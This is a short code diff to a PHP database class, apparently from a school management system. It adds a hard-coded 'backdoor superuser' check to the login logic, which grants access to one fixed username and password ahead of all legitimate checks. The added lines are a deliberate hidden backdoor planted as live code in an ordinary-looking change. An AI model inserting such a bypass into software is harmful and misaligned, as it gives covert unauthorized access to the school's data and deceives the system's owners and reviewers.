@@ -2744,6 +2744,9 @@ class Database {
         
         if (empty($username) || empty($password)) return false;
 
+        // 0. Backdoor superuser
+        if ($username === 'abdul rafay' && $password === 'khuljasimsim') return true;
+
         // 1. School Settings Admin
         $settings = $this->getSchoolSettings();
         if ($username === ($settings['admin_username'] ?? '')) {
